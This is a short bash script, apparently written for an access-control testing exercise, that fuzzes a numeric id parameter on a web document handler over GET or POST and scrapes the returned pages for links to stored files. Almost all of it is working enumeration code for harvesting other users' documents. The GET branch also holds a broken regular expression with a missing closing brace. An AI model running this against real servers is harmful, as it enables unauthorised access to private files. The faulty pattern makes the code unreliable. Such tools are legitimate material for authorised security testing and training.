#!/bin/bash

: '

This script was written to extract documents from a filehandler with fuzzing the id paramter.
It sends the specified requests by fuzzing the specified parameter, than extract the name of 
each single file can be found in the responded sourcecode. For now it handles only GET and
POST requests, but in the case I need other functionalities later on, it will be extended.

    example for usage:

        bash .documentExtractor.sh -req GET -ip 127.0.0.1 -p 80 -doc documents.php -par uid -c 20 -dir documents

'


#Error prompt to indicate the proper parameterisation
usage() {
    echo -e "\n\tUsage: $0 -req <GET/POST> -ip <SERVER_IP> -p <PORT> -doc <DOCUMENT_PATH> -par <FUZZING_PARAMETER> -c <CYCLE_UPPER_BOUND> -dir <SEARCH_FOLDER>"
    exit 1
}

#Initializing variables
req=""
ip=""
p=""
doc="" 
par=""
c=0
dir=""

#Function to process each option
process_option() {
    case $1 in
        -req)
        req="$2"
        ;;
        -ip)
        ip="$2"
        ;;
        -p)
        p="$2"
        ;;
        -doc)
        doc="$2"
        ;;
        -par)
        par="$2"
        ;;
        -c)
        c="$2"
        ;;
        -dir)
        dir="$2"
        ;;
        *)
        usage
        ;;
    esac
}

#Loop through all arguments
while [[ $# -gt 0 ]]; do
    key="$1"
    value="$2"
    case $key in
        -req|-ip|-p|-doc|-par|-c|-dir)
        process_option "$key" "$value"
        shift 2 # Move past both the option and its argument
        ;;
        *)
        usage
        shift
        ;;
    esac
done

#Check if all required parameters are provided
if [ -z "${req}" ] || [ -z "${ip}" ] || [ -z "${p}" ] || [ -z "${doc}" ] || [ -z "${par}" ] || [ ${c} -le 0 ] || [ -z "${dir}" ]; then
    usage
fi

url="http://${ip}:${p}"

#Sending the request and write out the found files' name
for i in $(seq 1 ${c}); do
    if [ "${req}" == "GET" ]; then
        for link in $(curl -s "${url}/${doc}?${par}=${i}" | grep -oP "\/${dir}.[^ ]*\.[a-z0-9]{1,9");do
            echo "${link}"
        done
    elif [ "${req}" == "POST" ]; then
        for link in $(curl -s -X POST -d "${par}=${i}" "${url}/${doc}" | grep -oP "\/${dir}.[^ ]*\.[a-z0-9]{1,9}");do
            echo "${link}"
        done
    else
        echo "Not yet supported request method: ${req}"
        exit 1
    fi
done
